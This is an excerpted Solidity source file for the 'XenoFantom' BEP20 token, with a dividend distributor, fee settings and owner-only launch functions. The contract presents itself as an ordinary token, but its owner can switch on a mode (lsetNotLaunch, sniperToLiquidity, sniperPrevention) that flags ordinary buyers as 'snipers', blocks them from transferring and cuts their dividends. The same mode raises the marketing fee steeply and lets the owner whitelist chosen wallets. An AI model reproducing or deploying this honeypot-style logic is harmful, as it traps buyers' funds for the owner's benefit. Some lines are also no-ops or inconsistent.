...
// Telegram : https://t.me/xenofantom
// Website : https://xenofantom.finance/
// Twitter : https://twitter.com/XenoFantomBSC
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 public ADA = IBEP20(0xAD29AbB318791D579433D831ed122aFeAf29dcfe);
    ...
    uint256 public minimumTokenBalanceForDividends = 10000 * (10**9);
...
contract XenoFantom is Ownable, IBEP20, SafeToken, LockToken {
    using SafeMath for uint256;
    ...
    string constant _name = "XenoFantom";
    string constant _symbol = "XenoFantom";
    ...
    bool public sniperToLiquidity = false;
    bool public sniperPrevention = false;
    mapping (address => bool) public sniperWallet;
    mapping (address => bool) public nonSniperWallet;

    uint256 public liquifyMaxSell = 3;

    uint256 public _maxTxAmount = 10;
    uint256 public maxSellTransactionAmount = _totalSupply;
    
    uint256 public _maxWallet = _totalSupply.mul(450).div(10000);
    uint256 public buyBackUpperLimit = 2 * 10**15;

    uint256 burnFee = 50;
    uint256 preflectionFee = 200;
    uint256 pmarketingFee = 1100;
    uint256 ptotalFee = burnFee.add(reflectionFee).add(marketingFee);
    ...
    function setLiquifyMaxSell(uint256 cAmount) external onlyOwner() {
        liquifyMaxSell = cAmount;
    }
    ...
    function setSniperPrevention(bool _enabled) external onlyOwner {
        sniperPrevention = _enabled;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal open(sender, recipient) returns (bool) {
        ...
        if( !excludeFee[recipient] && sniperToLiquidity && (recipient != pair && recipient != 0x10ED43C718714eb63d5aA57B78B54704E256024E) && sender != owner() && recipient != owner() ) {
            sniperWallet[recipient] = true;
            excludeDividend[recipient] = true;
        }
    ...
    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        if (!excludeMaxTxn[sender]) {
            if(sniperPrevention) {
                require(nonSniperWallet[sender] || !sniperWallet[sender], "Address is sniper");
            }
        }
    ...
    function swapBack(uint256 amount) internal swapping {
        ...
        if(liquifyMaxSell > 1) {
            if(swapAmount > (amount*liquifyMaxSell) ) {
                swapAmount = (amount*liquifyMaxSell);
            }
        }
        ...
        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ...
            if(dualMarkEnable) {
                ...
                uint256 amountBNBMarketing2 = amountBNB.mul(marketingFee).div(totalFee).div(2);
    
                try distributor.deposit{value: amountBNBReflection}() {} catch {}
                (bool successOp1, ) = payable(marketing).call{value: amountBNBMarketing, gas: 30000}("");
                (bool successOp2, ) = payable(marketing2).call{value: amountBNBMarketing2, gas: 30000}("");
                emit SwapBackSuccess(swapThreshold);
                if(successOp1) {
                    amountBNBMarketing = amountBNBMarketing;
                }
                if(successOp2) {
                    amountBNBMarketing2 = amountBNBMarketing2;
                }
            } else {
                uint256 amountBNB = address(this).balance.sub(balanceBefore);
                uint256 amountBNBReflection = amountBNB.mul(reflectionFee).div(totalFee);
    ...
    function lsetNS(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            nonSniperWallet[accounts[i]] = excluded;
            excludeDividend[accounts[i]] = !excluded;
        }
    }
    function lsetBeforeLaunch() public onlyOwner() {
        _maxTxAmount = 10;
    }
    function lsetNotLaunch() public onlyOwner() {
        reflectionFee = 100;
        marketingFee = 3000;
        totalFee = burnFee.add(reflectionFee).add(marketingFee);
        _maxTxAmount = _totalSupply;
        sniperToLiquidity = true;
        sniperPrevention = true;
    }
    
    function lsetGrandLaunch() public onlyOwner() {
        sniperToLiquidity = false;
        reflectionFee = preflectionFee;
        marketingFee = pmarketingFee;
        totalFee = burnFee.add(reflectionFee).add(marketingFee);
        _maxTxAmount = _totalSupply;
    }
    ...
    function setMarketingWallet2(address _marketing) external onlyOwner {
        marketing2 = _marketing;
    }
